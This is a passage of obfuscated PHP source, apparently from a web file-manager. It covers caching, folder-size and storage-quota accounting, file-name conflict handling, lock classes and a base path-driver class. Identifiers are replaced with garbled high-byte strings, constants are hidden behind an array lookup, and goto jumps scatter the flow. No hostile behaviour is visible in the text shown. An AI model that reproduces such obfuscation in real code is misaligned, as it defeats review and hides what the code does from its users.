$¾ğÑÆĞí = intval($¾ğÑÆĞí); $òæ„òŸš = $íà¾Öõ[544] . $¾ğÑÆĞí; $Ê‹ûÑ¶Œ = _get(self::$cacheSourceInfo, $òæ„òŸš); if ($Ê‹ûÑ¶Œ) { return $Ê‹ûÑ¶Œ; } $´İÙÖÂ¶ = $this->where(array($íà¾Öõ[193] => $¾ğÑÆĞí))->find(); self::$cacheSourceInfo[$òæ„òŸš] = $´İÙÖÂ¶; return self::$cacheSourceInfo[$òæ„òŸš]; } public function sourceCacheClear($èé­„Ñí = false) { self::cacheClear($èé­„Ñí); } public static function cacheClear($Èì£íÑ = false) { $šºÍ”– =& $_SERVER[¼’ç§¼´]; if ($Èì£íÑ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$šºÍ”–[544] . $Èì£íÑ]); unset(self::$cachePathInfoMore[$Èì£íÑ]); unset(self::$cachePathInfo[$šºÍ”–[2302] . $Èì£íÑ]); unset(self::$cachePathInfo[$šºÍ”–[2303] . $Èì£íÑ]); } public function metaSet($º·Æ¸ë, $Á¹šĞß = null, $¿Ñ€šË„ = null) { $…†Şİ¿ó = parent::metaSet($º·Æ¸ë, $Á¹šĞß, $¿Ñ€šË„); if ($…†Şİ¿ó) { $this->sourceCacheClear($º·Æ¸ë); } return $…†Şİ¿ó; } public function pathInfoByPath($ÄˆÒúƒå, $ÖŒ•ĞëÉ) { $ŠüÕêæÆ =& $_SERVER[¼’ç§¼´]; $ó„ê¸Üì = !$ÖŒ•ĞëÉ ? array() : explode($ŠüÕêæÆ[8], trim($ÖŒ•ĞëÉ, $ŠüÕêæÆ[8])); $ï´°á = $ÄˆÒúƒå; foreach ($ó„ê¸Üì as $¥ÓİŞ’°) { $è¼‹Æäà = array($ŠüÕêæÆ[192] => $ï´°á, $ŠüÕêæÆ[32] => $¥ÓİŞ’°); $…´¼šğİ = $this->field($ŠüÕêæÆ[2304])->where($è¼‹Æäà)->select(); if (!$…´¼šğİ) { return !1; } $…´¼šğİ = array_sort_by($…´¼šğİ, $ŠüÕêæÆ[516]); $ï´°á = $…´¼šğİ[0][$ŠüÕêæÆ[193]]; } $ú¹è‹¸é = $this->sourceInfo($ï´°á); $this->pathInfoFilter($ú¹è‹¸é); return $ú¹è‹¸é; } protected function updateModifyTime($Ò—ì×§Ò) { $ÑÈùĞ´ =& $_SERVER[¼’ç§¼´]; $«‚”Åİ = defined($ÑÈùĞ´[2211]) ? USER_ID : 0; if (!$Ò—ì×§Ò) { return; } if (!is_array($Ò—ì×§Ò)) { $Ò—ì×§Ò = array($Ò—ì×§Ò); } foreach ($Ò—ì×§Ò as $à„ Şã· => $´Ÿì‘á™) { $Ò—ì×§Ò[$à„ Şã·] = intval($´Ÿì‘á™); $this->sourceCacheClear($´Ÿì‘á™); } $£íÂß’Ş = array($ÑÈùĞ´[193] => array($ÑÈùĞ´[7], $Ò—ì×§Ò)); $¡æ”°Á = array($ÑÈùĞ´[665] => $«‚”Åİ, $ÑÈùĞ´[509] => time()); $this->where($£íÂß’Ş)->save($¡æ”°Á); } public function folderSizeReset($¨î•ÔÔğ, $œŸø°òä = false) { $Òıã°‡ =& $_SERVER[¼’ç§¼´]; if ($this->statusIgnoreResetSpace) { return; } $´í¨ï™Í = $this->sourceInfo($¨î•ÔÔğ); $éîİÆµ = $Òıã°‡[2305] . $¨î•ÔÔğ; CacheLock::lock($éîİÆµ, 20); if ($œŸø°òä === !1) { $this->sourceCacheClear($¨î•ÔÔğ); $´í¨ï™Í = $this->sourceInfo($¨î•ÔÔğ); $ñê±âĞ = array($Òıã°‡[488] => $¨î•ÔÔğ, $Òıã°‡[515] => 0); $ÍŞ€Ë¿— = $this->where($ñê±âĞ)->sum($Òıã°‡[79]); $œŸø°òä = intval($ÍŞ€Ë¿—) - intval($´í¨ï™Í[$Òıã°‡[79]]); } if ($œŸø°òä == 0) { return CacheLock::unlock($éîİÆµ); } $ôÂš–ËÖ = $this->parentLevelArray($´í¨ï™Í[$Òıã°‡[595]]); if (!$ôÂš–ËÖ) { $ôÂš–ËÖ = array(); } $ôÂš–ËÖ[] = $´í¨ï™Í[$Òıã°‡[193]]; $ñê±âĞ = array($Òıã°‡[193] => array($Òıã°‡[503], $ôÂš–ËÖ)); if ($œŸø°òä < 0) { $ñê±âĞ[$Òıã°‡[79]] = array($Òıã°‡[1101], abs($œŸø°òä)); } $this->where($ñê±âĞ)->setAdd($Òıã°‡[79], $œŸø°òä); CacheLock::unlock($éîİÆµ); $®á§ğäò = $Òıã°‡[2306] . $´í¨ï™Í[$Òıã°‡[190]] . $Òıã°‡[4] . $´í¨ï™Í[$Òıã°‡[580]]; $ŒŞ“Ş“ = array($´í¨ï™Í[$Òıã°‡[190]], $´í¨ï™Í[$Òıã°‡[580]]); TaskRun::timeLimitCall($®á§ğäò, $Òıã°‡[2307], $ŒŞ“Ş“, 1.5); } public function folderSizeResetChildren($‰¸’±´) { $Ûøê«ší =& $_SERVER[¼’ç§¼´]; $this->sourceCacheClear($‰¸’±´); $¶ù¼‚‰á = $this->sourceInfo($‰¸’±´); $§õ‹æîÁ = array($Ûøê«ší[660] => 1, $Ûøê«ší[663] => $¶ù¼‚‰á[$Ûøê«ší[580]], $Ûøê«ší[666] => array($Ûøê«ší[626], $¶ù¼‚‰á[$Ûøê«ší[595]] . $‰¸’±´ . $Ûøê«ší[627])); $´¼ÃšŠÌ = $Ûøê«ší[2308]; $µŠºÚğ = $this->field($´¼ÃšŠÌ)->where($§õ‹æîÁ)->select(); $§õ‹æîÁ[$Ûøê«ší[496]] = 0; $ˆìœã«İ = $this->field($´¼ÃšŠÌ)->where($§õ‹æîÁ)->select(); if (!$ˆìœã«İ) { return; } $µŠºÚğ[] = $¶ù¼‚‰á; $µŠºÚğ = array_to_keyvalue($µŠºÚğ, $Ûøê«ší[193]); foreach ($µŠºÚğ as $€…É¾º => $Ä§•ùí¡) { $µŠºÚğ[$€…É¾º][$Ûøê«ší[2309]] = $µŠºÚğ[$€…É¾º][$Ûøê«ší[79]]; $µŠºÚğ[$€…É¾º][$Ûøê«ší[79]] = 0; } foreach ($ˆìœã«İ as $Ä§•ùí¡) { $À­·¸å¾ = $Ä§•ùí¡[$Ûøê«ší[192]] . $Ûøê«ší[12]; if (!isset($µŠºÚğ[$À­·¸å¾])) { continue; } if ($Ä§•ùí¡[$Ûøê«ší[516]] == $µŠºÚğ[$À­·¸å¾][$Ûøê«ší[516]]) { $µŠºÚğ[$À­·¸å¾][$Ûøê«ší[79]] += $Ä§•ùí¡[$Ûøê«ší[79]]; } } foreach ($µŠºÚğ as $Ä§•ùí¡) { $®©»ÇÓ§ = $this->parentLevelArray($Ä§•ùí¡[$Ûøê«ší[595]]); foreach ($®©»ÇÓ§ as $À­·¸å¾) { $À­·¸å¾ = $À­·¸å¾ . $Ûøê«ší[12]; if (!isset($µŠºÚğ[$À­·¸å¾])) { continue; } if ($Ä§•ùí¡[$Ûøê«ší[516]] == $µŠºÚğ[$À­·¸å¾][$Ûøê«ší[516]]) { $µŠºÚğ[$À­·¸å¾][$Ûøê«ší[79]] += $Ä§•ùí¡[$Ûøê«ší[79]]; } } } $êå‚ˆ÷Ï = array(); foreach ($µŠºÚğ as $Ä§•ùí¡) { if ($Ä§•ùí¡[$Ûøê«ší[79]] == $Ä§•ùí¡[$Ûøê«ší[2309]]) { continue; } $êå‚ˆ÷Ï[] = array($Ûøê«ší[193], $Ä§•ùí¡[$Ûøê«ší[193]], $Ûøê«ší[79], $Ä§•ùí¡[$Ûøê«ší[79]]); } $this->saveAll($êå‚ˆ÷Ï); } public function userSpaceReset($œ£ï¼§© = false) { $¥¢ßşŠ÷ =& $_SERVER[¼’ç§¼´]; $´ëúÍÒ½ = $this->where(array($¥¢ßşŠ÷[190] => self::TYPE_USER, $¥¢ßşŠ÷[580] => $œ£ï¼§©, $¥¢ßşŠ÷[496] => 0))->sum($¥¢ßşŠ÷[79]); $´ëúÍÒ½ = !$´ëúÍÒ½ || $´ëúÍÒ½ <= 0 ? 0 : $´ëúÍÒ½; Model($¥¢ßşŠ÷[588])->userEdit($œ£ï¼§©, array($¥¢ßşŠ÷[1972] => $´ëúÍÒ½)); } public function targetSpaceUpdate($íò•‰«…, $â­éß–É) { $·Ç¾–Õ =& $_SERVER[¼’ç§¼´]; if (!$â­éß–É) { return; } if (!in_array($íò•‰«…, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ö‡˜¥ˆ¢ = $this->targetSpaceSize($íò•‰«…, $â­éß–É); if ($íò•‰«… == self::TYPE_USER) { Model($·Ç¾–Õ[588])->userEdit($â­éß–É, array($·Ç¾–Õ[1972] => $Ö‡˜¥ˆ¢)); } else { if ($íò•‰«… == self::TYPE_GROUP) { Model($·Ç¾–Õ[596])->groupEdit($â­éß–É, array($·Ç¾–Õ[1972] => $Ö‡˜¥ˆ¢)); } } } public function targetSpaceSize($Á«¡¤¬›, $øØ±ˆú‘) { $æËÚçô¡ =& $_SERVER[¼’ç§¼´]; $¾ÔÕ ú» = 0; $„õ¯ÓÓ = $this->targetSourceRoot($Á«¡¤¬›, $øØ±ˆú‘, !0); foreach ($„õ¯ÓÓ as $š®ıš½æ) { if (!$š®ıš½æ) { continue; } $¾ÔÕ ú» += floatval($š®ıš½æ[$æËÚçô¡[79]]); $ù’ ıß = array($æËÚçô¡[666] => array($æËÚçô¡[626], $æËÚçô¡[604] . $š®ıš½æ[$æËÚçô¡[193]] . $æËÚçô¡[627])); $ôí£Ÿ®ˆ = Model($æËÚçô¡[514])->field($æËÚçô¡[502])->where($ù’ ıß)->select(); $ôí£Ÿ®ˆ = array_to_keyvalue($ôí£Ÿ®ˆ, $æËÚçô¡[12], $æËÚçô¡[193]); $ôí£Ÿ®ˆ = array_unique(array_filter($ôí£Ÿ®ˆ)); if ($ôí£Ÿ®ˆ) { $ù’ ıß = array($æËÚçô¡[502] => array($æËÚçô¡[503], $ôí£Ÿ®ˆ)); $¾ÔÕ ú» += floatval($this->where($ù’ ıß)->sum($æËÚçô¡[79])); } } $¾ÔÕ ú» = !$¾ÔÕ ú» || $¾ÔÕ ú» <= 0 ? 0 : $¾ÔÕ ú»; return $¾ÔÕ ú»; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÄóÊ€ÕÂ) { return $this->fileTypeProfile($ÄóÊ€ÕÂ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ƒ¾úÈá˜) { return $this->fileTypeProfile($ƒ¾úÈá˜, SourceModel::TYPE_GROUP); } private function fileTypeProfile($“”¤“€, $ë­÷¥ı) { $¸‹å×º¦ =& $_SERVER[¼’ç§¼´]; $‚ĞğÄ§¿ = $¸‹å×º¦[2310] . $“”¤“€ . $¸‹å×º¦[11] . $ë­÷¥ı; $Ò±Ó¸İß = Cache::get($‚ĞğÄ§¿); if ($Ò±Ó¸İß) { return $Ò±Ó¸İß; } $¨ß½‚â§ = array($¸‹å×º¦[660] => 0); if ($“”¤“€ != !1) { $¨ß½‚â§[$¸‹å×º¦[580]] = $“”¤“€; $¨ß½‚â§[$¸‹å×º¦[190]] = $ë­÷¥ı; } $æ×¨£Î¡ = array(); $æ×¨£Î¡[$¸‹å×º¦[2311]] = array($¸‹å×º¦[2312] => LNG($¸‹å×º¦[2311]), $¸‹å×º¦[2313] => $this->where($¨ß½‚â§)->count(), $¸‹å×º¦[631] => $this->where($¨ß½‚â§)->sum($¸‹å×º¦[79])); $®”ŒıçÑ = KodIO::fileTypeList(); foreach ($®”ŒıçÑ as $ÁöÙÛ‹¹ => $®³€èƒÄ) { $¨ß½‚â§[$¸‹å×º¦[497]] = $this->fileTypeWhere($ÁöÙÛ‹¹); $æ×¨£Î¡[$ÁöÙÛ‹¹] = array($¸‹å×º¦[2312] => $®³€èƒÄ[$¸‹å×º¦[32]], $¸‹å×º¦[2313] => $this->where($¨ß½‚â§)->count(), $¸‹å×º¦[631] => $this->where($¨ß½‚â§)->sum($¸‹å×º¦[79])); } Cache::set($‚ĞğÄ§¿, $æ×¨£Î¡, 1200); return $æ×¨£Î¡; } public function fileNameExist($Çüœ§, $†÷ƒç) { $Â‹Êã›· =& $_SERVER[¼’ç§¼´]; $ú½í…ïš = $this->field($Â‹Êã›·[2314])->where(array($Â‹Êã›·[192] => $Çüœ§, $Â‹Êã›·[32] => $†÷ƒç, $Â‹Êã›·[516] => 0))->find(); return is_array($ú½í…ïš) ? $ú½í…ïš[$Â‹Êã›·[193]] : !1; } public function childList($¯Ÿ¥«… ) { $Éõà³¿ =& $_SERVER[¼’ç§¼´]; $˜“ÌßúÆ = $Éõà³¿[2285] . $¯Ÿ¥«… ; if (isset(self::$cacheChildList[$˜“ÌßúÆ])) { return self::$cacheChildList[$˜“ÌßúÆ]; } $—å§ˆà = array($Éõà³¿[192] => intval($¯Ÿ¥«… ), $Éõà³¿[516] => 0); $æ³–ã›Ò = $this->where($—å§ˆà)->select(); $æ³–ã›Ò = $æ³–ã›Ò ? $æ³–ã›Ò : array(); self::$cacheChildList[$˜“ÌßúÆ] = $æ³–ã›Ò; foreach ($æ³–ã›Ò as $¥îŞ Ù¢) { $˜“ÌßúÆ = $Éõà³¿[544] . $¥îŞ Ù¢[$Éõà³¿[193]]; self::$cacheSourceInfo[$˜“ÌßúÆ] = $¥îŞ Ù¢; } return $æ³–ã›Ò; } public function fileNameAuto($İˆŸœ¦®, $ÃÃã†, $—ğÔÃŸ² = REPEAT_RENAME, $šÜ‡…Ê  = false) { $‰÷íš¢‰ =& $_SERVER[¼’ç§¼´]; $ÂğüÔè = get_path_ext($ÃÃã†); $€ƒëÖÁ = $ÂğüÔè ? get_path_ext_name($ÃÃã†) . $‰÷íš¢‰[2315] . $ÂğüÔè : $ÃÃã† . $‰÷íš¢‰[471]; $îÍùá©£ = array($‰÷íš¢‰[192] => $İˆŸœ¦®, $‰÷íš¢‰[516] => 0, $‰÷íš¢‰[32] => array($‰÷íš¢‰[470], $€ƒëÖÁ)); $­ÈôÍş = $this->field($‰÷íš¢‰[32])->where($îÍùá©£)->select(); $ëÏ•²³ = array_to_keyvalue($­ÈôÍş, $‰÷íš¢‰[12], $‰÷íš¢‰[32]); return $this->fileNameAutoGet($ëÏ•²³, $ÃÃã†, $—ğÔÃŸ², $šÜ‡…Ê ); } public function fileNameAutoGet($¥ÖÔ¼ßü, $ÕßÆ§ß, $éùÀÏŞ€, $ô©¸å°å) { $¬Øù´¥ù =& $_SERVER[¼’ç§¼´]; if ($éùÀÏŞ€ == REPEAT_REPLACE || !$¥ÖÔ¼ßü || !in_array_not_case($ÕßÆ§ß, $¥ÖÔ¼ßü) || $ô©¸å°å && $éùÀÏŞ€ != REPEAT_RENAME_FOLDER) { return $ÕßÆ§ß; } if ($éùÀÏŞ€ == REPEAT_SKIP) { return !1; } $†¬ˆµŒ = $¬Øù´¥ù[10] . get_path_ext($ÕßÆ§ß); $†¬ˆµŒ = $†¬ˆµŒ == $¬Øù´¥ù[10] || $ô©¸å°å ? $¬Øù´¥ù[12] : $†¬ˆµŒ; for ($µ”„ëş = 1; $µ”„ëş <= count($¥ÖÔ¼ßü) + 1; $µ”„ëş++) { $ÒÏõ°è = substr($ÕßÆ§ß, 0, strlen($ÕßÆ§ß) - strlen($†¬ˆµŒ)); $ŠÉŞ˜Û« = $ÒÏõ°è . "\50{$µ”„ëş}\51{$†¬ˆµŒ}"; if (!in_array_not_case($ŠÉŞ˜Û«, $¥ÖÔ¼ßü)) { return $ŠÉŞ˜Û«; } } } } goto D“ÅÆ¡Ë»Ñ; b·„†ñ‘‹É: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¦æÍ¯¡í =& $_SERVER[¼’ç§¼´]; $˜öÔô™ˆ = $GLOBALS[$¦æÍ¯¡í[6]][$¦æÍ¯¡í[426]]; self::$cachePath = $˜öÔô™ˆ[$¦æÍ¯¡í[232]][$¦æÍ¯¡í[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($’—äüŞğ, $äğ¯Âª» = 0) { $½£Ç¿ÒÌ =& $_SERVER[¼’ç§¼´]; $æ£§¶É– = microtime(!0); $‹¥º” = $æ£§¶É– + $äğ¯Âª» + 0.0001; $³šµª = rtrim(self::$cachePath, $½£Ç¿ÒÌ[8]) . $½£Ç¿ÒÌ[953] . md5($’—äüŞğ) . $½£Ç¿ÒÌ[950]; if (file_exists($³šµª) && filemtime($³šµª) && filemtime($³šµª) < time() - 10) { @unlink($³šµª); } do { if (file_exists($³šµª)) { cacheLockWait(); continue; } $ßÔÊÌ«ª = fopen($³šµª, $½£Ç¿ÒÌ[954]); if (!$ßÔÊÌ«ª) { return !1; } $ı‚Ä¿Ø¿ = flock($ßÔÊÌ«ª, LOCK_EX | LOCK_NB); self::$caches[$’—äüŞğ] = array($½£Ç¿ÒÌ[955] => $ßÔÊÌ«ª, $½£Ç¿ÒÌ[232] => $³šµª); fwrite($ßÔÊÌ«ª, $‹¥º”); clearstatcache(); if ($ßÔÊÌ«ª && $ı‚Ä¿Ø¿) { return !0; } cacheLockWait(); } while (microtime(!0) < $‹¥º”); $this->unlock($’—äüŞğ); return !1; } public function lockGet($ÛÎ€ä®´) { $Õ…š›¹ =& $_SERVER[¼’ç§¼´]; $üÃ…ú›• = rtrim(self::$cachePath, $Õ…š›¹[8]) . $Õ…š›¹[953] . md5($ÛÎ€ä®´) . $Õ…š›¹[950]; return file_exists($üÃ…ú›•); } public function unlock($Ê—ñ´) { $éó¦„­§ =& $_SERVER[¼’ç§¼´]; $¡×ï© ƒ = self::$caches[$Ê—ñ´]; if (!$¡×ï© ƒ) { return; } @flock($¡×ï© ƒ[$éó¦„­§[955]], LOCK_UN); @fclose($¡×ï© ƒ[$éó¦„­§[955]]); @unlink($¡×ï© ƒ[$éó¦„­§[232]]); unset(self::$caches[$Ê—ñ´]); } } class CacheLockRedis { public function lock($”¾¦áÆÕ, $İØå·İ = 10) { $è×–÷¹ = Cache::init(); $Â…¿¾ = microtime(!0) + $İØå·İ; while (microtime(!0) < $Â…¿¾) { $Ì‹å°æÄ = $è×–÷¹->get($”¾¦áÆÕ); if (!$Ì‹å°æÄ) { $ö÷œÂ¦ì = $è×–÷¹->setLock($”¾¦áÆÕ, $Â…¿¾, $İØå·İ); if ($ö÷œÂ¦ì) { return !0; } } else { if ($Ì‹å°æÄ < microtime(!0)) { $è×–÷¹->set($”¾¦áÆÕ, $Â…¿¾, $İØå·İ * 2); if ($è×–÷¹->get($”¾¦áÆÕ) === $Ì‹å°æÄ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($‘œÉ©Ö) { return Cache::init()->get($‘œÉ©Ö); } public function unlock($„«™è¼¨) { return Cache::init()->remove($„«™è¼¨); } } class CacheLockMemcached { public function lock($ÚøÒõ¹à, $Ï•Æ²ıï = 0) { $´Âñáàä = Cache::init(); $“—Ü™ÒŞ = microtime(!0) + $Ï•Æ²ıï; while (microtime(!0) < $“—Ü™ÒŞ) { $¬æĞ’­Ø = $´Âñáàä->get($ÚøÒõ¹à); if (!$¬æĞ’­Ø || $¬æĞ’­Ø < microtime(!0)) { $œ£•¾Ö¬ = $´Âñáàä->handle->add($ÚøÒõ¹à, $“—Ü™ÒŞ, $Ï•Æ²ıï); if ($œ£•¾Ö¬) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…¨Óƒ²Š) { return Cache::init()->get($…¨Óƒ²Š); } public function unlock($îêì…²ö) { return Cache::init()->remove($îêì…²ö); } } goto FñùŒ†¢ñÇ; c«½êÓµ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $©©é¿ï½ =& $_SERVER[¼’ç§¼´]; $this->objectDriver = array($©©é¿ï½[60], $©©é¿ï½[61], $©©é¿ï½[62], $©©é¿ï½[63], $©©é¿ï½[64], $©©é¿ï½[65], $©©é¿ï½[66], $©©é¿ï½[67], $©©é¿ï½[68], $©©é¿ï½[69], $©©é¿ï½[70], $©©é¿ï½[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($üò’Ø¥¸) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($üò’Ø¥¸, $_SERVER[¼’ç§¼´][8]); } return $üò’Ø¥¸; } public function iconvApp($İİªäë») { return $İİªäë»; } public function iconvSystem($éß‡ŠÆÊ) { return $éß‡ŠÆÊ; } public function iconvTo($¼ÅßÆÒ, $Ã¼ˆçù, $”åìä÷×) { $àË„«„Û =& $_SERVER[¼’ç§¼´]; if (!$¼ÅßÆÒ || !function_exists($àË„«„Û[72])) { return $¼ÅßÆÒ; } static $øûş©Ù¨ = array(); $²Ù¿‹¾Ö = $Ã¼ˆçù . $àË„«„Û[73] . $”åìä÷× . $àË„«„Û[74] . $¼ÅßÆÒ; if (isset($øûş©Ù¨[$²Ù¿‹¾Ö])) { return $øûş©Ù¨[$²Ù¿‹¾Ö]; } if (function_exists($àË„«„Û[75])) { $ÀŸÛ¯û‰ = @mb_convert_encoding($¼ÅßÆÒ, $”åìä÷×, $Ã¼ˆçù); } else { $ÀŸÛ¯û‰ = @iconv($Ã¼ˆçù, $”åìä÷×, $¼ÅßÆÒ); } $ÀŸÛ¯û‰ = $ÀŸÛ¯û‰ ? $ÀŸÛ¯û‰ : $¼ÅßÆÒ; if (strstr($ÀŸÛ¯û‰, $àË„«„Û[76])) { $ÀŸÛ¯û‰ = str_replace($àË„«„Û[76], $àË„«„Û[11], $ÀŸÛ¯û‰); } $øûş©Ù¨[$Ã¼ˆçù . $àË„«„Û[73] . $”åìä÷× . $àË„«„Û[74] . $¼ÅßÆÒ] = $ÀŸÛ¯û‰; $øûş©Ù¨[$”åìä÷× . $àË„«„Û[73] . $Ã¼ˆçù . $àË„«„Û[74] . $¼ÅßÆÒ] = $¼ÅßÆÒ; $øûş©Ù¨[$”åìä÷× . $àË„«„Û[73] . $Ã¼ˆçù . $àË„«„Û[74] . $ÀŸÛ¯û‰] = $¼ÅßÆÒ; $øûş©Ù¨[$Ã¼ˆçù . $àË„«„Û[73] . $”åìä÷× . $àË„«„Û[74] . $ÀŸÛ¯û‰] = $ÀŸÛ¯û‰; return $ÀŸÛ¯û‰; } public function getPathInner($ş£›ØÎÄ) { $ƒ†õÕˆ = IO::init($ş£›ØÎÄ); return $ƒ†õÕˆ->path; } public function getPathOuter($á½œäâÏ) { $¨Õ«îûØ =& $_SERVER[¼’ç§¼´]; $¶øø¾ = strlen(trim($this->pathBase, $¨Õ«îûØ[8])); $á½œäâÏ = substr(trim($á½œäâÏ, $¨Õ«îûØ[8]), $¶øø¾); return $this->pathDriver . $¨Õ«îûØ[8] . ltrim($á½œäâÏ, $¨Õ«îûØ[8]); } public function isParentOf($èòÃ†°ˆ, $Şó‡Î¬Œ) { $çšÑ¢şã =& $_SERVER[¼’ç§¼´]; $èòÃ†°ˆ = rtrim(strtolower($èòÃ†°ˆ), $çšÑ¢şã[8]) . $çšÑ¢şã[8]; $Şó‡Î¬Œ = rtrim(strtolower($Şó‡Î¬Œ), $çšÑ¢şã[8]) . $çšÑ¢şã[8]; $û›÷°şï = strpos($Şó‡Î¬Œ, $èòÃ†°ˆ) === 0; return $û›÷°şï; } public function getType() { $üğ®ú =& $_SERVER[¼’ç§¼´]; $ÍŸ´áà÷ = str_replace($üğ®ú[77], $üğ®ú[12], get_class($this)); return strtolower($ÍŸ´áà÷); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‰üêËğ¾, $¬—Ï°›ö) { $´²Œæš‚ =& $_SERVER[¼’ç§¼´]; $˜†ÂËûÀ = rtrim($‰üêËğ¾, $´²Œæš‚[8]) . $´²Œæš‚[8] . $¬—Ï°›ö; $Ì¸¦¬´£ = $this->exist($˜†ÂËûÀ); return $Ì¸¦¬´£ ? $˜†ÂËûÀ : !1; } public function setModifyTime($êß‰Ä£, $ğ±·Ì÷ê = '') { } public function renameObject($Àˆí‹Óã, $‘ßÖ‘š›) { $ïÖ›¼Ùï = $‘ßÖ‘š›; $Àˆí‹Óã = $this->getPathOuter($Àˆí‹Óã); $‘ßÖ‘š› = $this->pathFather($Àˆí‹Óã) . $‘ßÖ‘š›; $ß©€ÚĞ¼ = IO::copy($Àˆí‹Óã, $this->pathFather($Àˆí‹Óã), REPEAT_RENAME_FOLDER, $ïÖ›¼Ùï); if ($ß©€ÚĞ¼) { IO::remove($Àˆí‹Óã); } return $ß©€ÚĞ¼ ? $‘ßÖ‘š› : !1; } public function tempFile($ÀÚ›—ıË = '', $¬Òêò†’ = '') { if (!$ÀÚ›—ıË) { $ÀÚ›—ıË = rand_string(15); } $”šû¨ú = TEMP_FILES . rand_string(15) . $_SERVER[¼’ç§¼´][8]; @mkdir($”šû¨ú, DEFAULT_PERRMISSIONS, !0); $·›ª£¼¡ = $”šû¨ú . $ÀÚ›—ıË; @touch($·›ª£¼¡); if ($¬Òêò†’) { file_put_contents($·›ª£¼¡, $¬Òêò†’); } return $·›ª£¼¡; } public function tempFileRemve($ÈÓÆÚ»í) { @unlink($ÈÓÆÚ»í); @rmdir($this->pathFather($ÈÓÆÚ»í)); } public function mkfile($óêßÂéì, $¿´§Ó² = '', $Ğ¬¾—…­ = REPEAT_RENAME) { } public function mkdir($è¦¼¢‚¨, $ï´™ÃĞÂ = REPEAT_SKIP) { } public function delFile($ãŸÚ¦Ğ¬) { } public function delFolder($í’ì¸óÏ) { } public function copyFile($‰öÒ¢—Â, $İÒ‹âè®) { } public function moveFile($¡Ğ…ìú, $÷´£ªı°) { } public function remove($«ŸÓ¥Ğ„) { if ($this->isFile($«ŸÓ¥Ğ„)) { return $this->delFile($«ŸÓ¥Ğ„); } return $this->delFolder($«ŸÓ¥Ğ„); } public function rename($ùïÌîÛ³, $İ®®˜äÏ) { } public function exist($ú·Ÿôş) { } public function findByHash($š–èŸ¾ = '', $µü£ìï = '') { return !1; } public function isFile($»Ü÷ûø¡) { } public function isFolder($‘ç×) { } public function size($íïı¿ÂÚ) { } public function info($Á™—„ãñ) { } public function infoSimple($ä”¼ÇÂ¯) { return $this->info($ä”¼ÇÂ¯); } public function infoAuth($æš±šê¤) { return $this->info($æš±šê¤); } public function infoFull($Íßâ Ö„) { return $this->info($Íßâ Ö„); } public function infoFullSimple($á†Åƒøî) { return $this->info($á†Åƒøî); } public function infoWithChildren($ÚÛËŠòÎ) { $µ›òÅó =& $_SERVER[¼’ç§¼´]; static $Ÿ£Ü¯ë = array(); if (isset($Ÿ£Ü¯ë[$ÚÛËŠòÎ])) { return $Ÿ£Ü¯ë[$ÚÛËŠòÎ]; } $ßä¹Í¾ß = $this->info($ÚÛËŠòÎ); if ($ßä¹Í¾ß && $ßä¹Í¾ß[$µ›òÅó[33]] == $µ›òÅó[78]) { $Ãå£³¾ò = array($µ›òÅó[79] => 0, $µ›òÅó[80] => 0, $µ›òÅó[81] => 0); $this->infoChildren($ÚÛËŠòÎ, $Ãå£³¾ò); $ßä¹Í¾ß[$µ›òÅó[79]] = $Ãå£³¾ò[$µ›òÅó[79]]; $ßä¹Í¾ß[$µ›òÅó[82]] = array($µ›òÅó[83] => $Ãå£³¾ò[$µ›òÅó[80]], $µ›òÅó[84] => $Ãå£³¾ò[$µ›òÅó[81]]); $Ÿ£Ü¯ë[$ÚÛËŠòÎ] = $ßä¹Í¾ß; } return $ßä¹Í¾ß; } public function listPath($‰Š¸•¥¼, $ÀºË¥Ş = false) { } public function has($Ì¨è¸Ï®, $ºÎ¿®ĞÌ = false, $¨·Ş¢œÛ = false) { } public function canRead($°ÈÆœÜ×) { } public function canWrite($Ûµá¾ì) { } public function getContent($­ùêö€š) { } public function setContent($™õ–ı·—, $¢ÍîĞğ÷ = '') { } protected function infoChildren($®•ŸÁÊû, &$âÇŒïĞ) { $†æİ‚Í =& $_SERVER[¼’ç§¼´]; check_abort_echo(); $Ò˜ªÃ“ = $this->listPath($®•ŸÁÊû, !0); $Ò˜ªÃ“ = array_merge($Ò˜ªÃ“[$†æİ‚Í[85]], $Ò˜ªÃ“[$†æİ‚Í[86]]); foreach ($Ò˜ªÃ“ as $°ã”ìèÒ) { if ($°ã”ìèÒ[$†æİ‚Í[33]] == $†æİ‚Í[78]) { $âÇŒïĞ[$†æİ‚Í[81]]++; $‡’·ƒ»î = $this->getPathInner($°ã”ìèÒ[$†æİ‚Í[87]]); $this->infoChildren($‡’·ƒ»î, $âÇŒïĞ); } else { $âÇŒïĞ[$†æİ‚Í[80]]++; $âÇŒïĞ[$†æİ‚Í[79]] += $°ã”ìèÒ[$†æİ‚Í[79]]; } } } public function fileSubstr($Š–›÷ÑÚ, $«ï šÂ , $ó³Í¹íã) { } public function listAll($·Ç¨„ğî) { } public function listAllMake($ÕŸĞè—, &$ôÎûËË¨) { $¯ÒÀ¯ä =& $_SERVER[¼’ç§¼´]; check_abort_echo(); $ÁÅŠ‘Ø = $this->listPath($ÕŸĞè—, !0); if (!$ÁÅŠ‘Ø) { return; } $¦ˆıÑê = array_merge($ÁÅŠ‘Ø[$¯ÒÀ¯ä[85]], $ÁÅŠ‘Ø[$¯ÒÀ¯ä[86]]); foreach ($¦ˆıÑê as $«ÒÊÅ‘) { $†²÷”ë‚ = $«ÒÊÅ‘[$¯ÒÀ¯ä[33]] == $¯ÒÀ¯ä[78]; $®Æ¼…¡¤ = array($¯ÒÀ¯ä[87] => $«ÒÊÅ‘[$¯ÒÀ¯ä[87]], $¯ÒÀ¯ä[78] => $†²÷”ë‚); if 